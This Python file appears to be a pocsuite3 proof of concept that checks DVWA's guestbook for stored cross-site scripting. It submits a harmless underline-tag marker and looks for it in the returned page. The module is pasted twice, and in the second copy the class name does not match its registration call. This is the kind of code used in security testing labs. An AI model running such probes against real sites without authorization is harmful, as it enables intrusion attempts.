# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Stored XSS'
    vulType = VUL_TYPE.XSS

    def _verify(self):
        result = {}
        path = self.url.rstrip('/') + "/index.php"
        if "xss_s" in self.url.lower():
            token = "stored_xss_check_888"
            payload = f"<u>{token}</u>"
            self.set_payload(payload)

            data = {'txtName': 'bot', 'mtxMessage': payload, 'btnSign': 'Sign+Guestbook'}

            try:
                # 1. 提交留言
                requests.post(path, data=data)
                # 2. 刷新页面检查回显
                res = requests.get(path)
                if payload in res.text:
                    result['VerifyInfo'] = {"URL": path, "Info": "Payload persists in guestbook"}
            except:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerable')
        return output


register_poc(POC)# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE

class TestPOC(POCBase):
    name = 'DVWA Stored XSS'
    vulType = VUL_TYPE.XSS

    def _verify(self):
        result = {}
        path = self.url.rstrip('/') + "/index.php"
        if "xss_s" in self.url.lower():
            token = "stored_xss_check_888"
            payload = f"<u>{token}</u>"
            self.set_payload(payload)

            data = {'txtName': 'bot', 'mtxMessage': payload, 'btnSign': 'Sign+Guestbook'}

            try:
                # 1. 提交留言
                requests.post(path, data=data)
                # 2. 刷新页面检查回显
                res = requests.get(path)
                if payload in res.text:
                    result['VerifyInfo'] = {"URL": path, "Info": "Payload persists in guestbook"}
            except: pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result: output.success(result)
        else: output.fail('not vulnerable')
        return output

register_poc(POC)